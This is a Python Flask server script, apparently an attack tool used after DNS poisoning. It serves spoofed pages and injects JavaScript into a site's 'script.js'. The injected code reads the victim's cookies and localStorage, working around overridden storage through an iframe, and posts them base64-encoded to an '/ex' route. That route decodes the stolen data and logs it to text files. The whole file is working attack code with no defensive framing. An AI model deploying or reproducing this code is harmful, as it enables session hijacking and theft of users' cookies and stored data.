from flask import app, Flask, request
import base64, os
def log(pkt,file="IPs.txt"):
    if file not in os.listdir():
        open(file,"w").close()
    of = open(file,"r").read()
    f = open(file,"w")
    f.write(of)
    f.write(pkt+"\n")
    f.close()

has_shown_msg = False
"""
This javascript will be injected into the 'script.js' file to steal the victim's cookies and local storage, 
and potentially allow for an attacker to steal their session.
"""
injected_javascript = b"""
    ;function getLocalStoragePropertyDescriptor() {
        const iframe = document.createElement('iframe');
        document.head.append(iframe);
        const pd = Object.getOwnPropertyDescriptor(iframe.contentWindow, 'localStorage');
        iframe.remove();
        return pd;
    }
    var cookies = document.cookie;
    Object.defineProperty(window, 'localStorage', getLocalStoragePropertyDescriptor());
    const localStorage = getLocalStoragePropertyDescriptor().get.call(window);
    pkt = "";
    for(var i = 0; i < localStorage.length; i ++){
        var key = localStorage.key(i);
            pkt += localStorage[key];
    }
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "./ex", true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.send(JSON.stringify({
        "localstorage": btoa(pkt),
        "cookies": btoa(cookies)
    }));
"""

app = Flask(__name__)
app2 = Flask(__name__ + "1")

@app.route("/troll.png")
def send_troll():
    """
    If you are choosing the malicious index.html, this trollface image would show up!
    """
    return open("troll.png","rb").read()

@app.route("/jquery.js")
def send_jquery():
    return open("jquery.js","rb").read()

@app.route("/ex",methods=["POST"])
def exfiltrate_local_storage():
    values = request.get_json()
    local_storage = values.get("localstorage")
    cookies = values.get("cookies")
    if local_storage and local_storage != "":
        print(msg:=f"[!] Harvested Local Storage Data from {request.remote_addr} at {request.host_url}.")
        log(msg[:-1] + f":\n    {base64.b64decode(local_storage.encode()).decode()}","LocalStorageLog.txt")
    if cookies and cookies != "":
        print(msg:=f"[!] Harvested Cookies from {request.remote_addr} at {request.host_url}:\n    {base64.b64decode(cookies.encode()).decode()}")
        log(msg,"cookies.txt")
    return ""
@app.route("/script.js")
def send_script():
    """
    This will send the contents of script.js, with a little bit of salt sprinked in!
    """
    return open("script.js","rb").read() + injected_javascript

@app.route('/')
@app.route('/<path:path>')
def home_page(path=None):
    global has_shown_msg
    head = request.headers
    has_host = head.get("host")
    if has_host and not has_shown_msg:
        has_shown_msg = True
        print(f"""__________                          .___._.
\______   \__  _  ______   ____   __| _/| |
 |     ___/\ \/ \/ /    \_/ __ \ / __ | | |
 |    |     \     /   |  \  ___// /_/ |  \|
 |____|      \/\_/|___|  /\___  >____ |  __
                       \/     \/     \/  \/
[!] A request has been forwarded from {has_host} to this server! DNS Poisoning is possible on your network.""")
    return open("index.html","rb").read() 

@app2.route("/")
def home():
    # Redirect the user to the HTTPS Server
    # return '<meta http-equiv = "refresh" content = "2; url = " />'
    # This may be a problem for those who are not using JavaScript.
    return '<script>location = `https://${location["origin"].split("/")[location["origin"].split("/").length - 1]}`</script>'

def start_server():
    app.run("0.0.0.0",ssl_context=('cert.pem', 'key.pem'),port=443)

def start_server2():
    app2.run("0.0.0.0",port=80)